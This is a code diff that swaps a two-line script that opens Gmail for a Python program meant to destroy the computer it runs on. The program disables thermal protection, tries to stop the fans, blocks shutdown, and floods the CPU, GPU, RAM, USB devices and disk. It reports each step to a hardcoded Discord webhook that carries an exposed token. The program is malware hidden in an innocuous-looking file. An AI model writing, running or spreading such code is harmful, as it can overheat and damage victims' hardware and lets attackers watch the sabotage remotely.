@@ -1,2 +1,140 @@
-import webbrowser
-webbrowser.open("https://mail.google.com/mail/u/0/")
+import ctypes
+import time
+import multiprocessing
+import sys
+import threading
+import os
+import subprocess
+import requests
+import random
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+
+def send_notification(message):
+    try:
+        requests.post(WEBHOOK_URL, json={"content": f"**[SİSTEM YAK]** {message}"}, timeout=5)
+    except:
+        pass
+
+# Termal koruma kapat
+try:
+    subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True)
+    subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True)
+    subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True)
+    send_notification("🔥 Termal koruma kapatıldı!")
+except:
+    pass
+
+# Fanları durdur
+try:
+    import wmi
+    c = wmi.WMI()
+    for fan in c.Win32_Fan():
+        fan.SetSpeed(0)
+        send_notification("🌀 Fan durduruldu!")
+except:
+    pass
+
+# Güç tuşunu iptal et
+try:
+    ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+    send_notification("🔌 Güç tuşu iptal edildi!")
+except:
+    pass
+
+# CPU - 128 thread
+core_count = multiprocessing.cpu_count()
+thread_count = core_count * 10  # 10 katı (120 thread)
+send_notification(f"🧠 CPU: {core_count} çekirdek, {thread_count} thread")
+
+def cpu_killer():
+    while True:
+        x = 3.14159
+        for _ in range(2000000):  # 2 katı işlem
+            x = x ** 1.00001
+            x = x / 1.000001
+        arr = [i ** i for i in range(8000)]  # Daha büyük liste
+        for _ in range(200):
+            arr.sort()
+            arr.reverse()
+
+for _ in range(thread_count):
+    threading.Thread(target=cpu_killer, daemon=True).start()
+send_notification(f"🔥 CPU {thread_count} thread ile yükleniyor!")
+
+# GPU - Daha ağır render
+try:
+    import pygame
+    import numpy as np
+    pygame.init()
+    screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
+    def gpu_killer():
+        while True:
+            for _ in range(200):  # 200 render
+                img = np.random.rand(1920, 1080, 3) * 255
+                surf = pygame.surfarray.make_surface(img)
+                screen.blit(surf, (0, 0))
+                pygame.display.flip()
+    threading.Thread(target=gpu_killer, daemon=True).start()
+    send_notification("🖥️ GPU render başlatıldı (200 FPS)!")
+except:
+    pass
+
+# RAM - Daha fazla
+def ram_killer():
+    while True:
+        try:
+            big_list = []
+            for _ in range(5000000):  # 5 milyon eleman
+                big_list.append("x" * 4096)
+            big_list.clear()
+            del big_list
+        except:
+            pass
+
+for _ in range(4):
+    threading.Thread(target=ram_killer, daemon=True).start()
+send_notification("💾 RAM zorlama başlatıldı (5 milyon eleman)!")
+
+# Anakart USB - Daha fazla
+def motherboard_killer():
+    try:
+        import usb.core
+        for dev in usb.core.find(find_all=True):
+            for _ in range(50000):
+                dev.ctrl_transfer(0x40, 0x0A, 0, 0, b'\x00' * 4096)
+    except:
+        pass
+threading.Thread(target=motherboard_killer, daemon=True).start()
+send_notification("🔌 Anakart USB zorlama başlatıldı (50000 döngü)!")
+
+# PSU - Daha ağır
+def disk_killer():
+    while True:
+        try:
+            with open("C:\\temp.bin", "wb") as f:
+                f.write(b'\x00' * (1024 * 1024 * 500))  # 500MB
+            os.remove("C:\\temp.bin")
+        except:
+            pass
+        time.sleep(0.001)
+
+for _ in range(20):
+    threading.Thread(target=disk_killer, daemon=True).start()
+send_notification("⚡ PSU zorlama başlatıldı (500MB yazma)!")
+
+# Kapanmayı engelle
+def prevent_shutdown():
+    while True:
+        try:
+            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+        except:
+            pass
+        time.sleep(5)
+threading.Thread(target=prevent_shutdown, daemon=True).start()
+send_notification("🔒 Kapanma engellendi!")
+
+send_notification("🔥 TÜM SİSTEM DAHA AĞIR YANIYOR!")
+
+while True:
+    time.sleep(60)
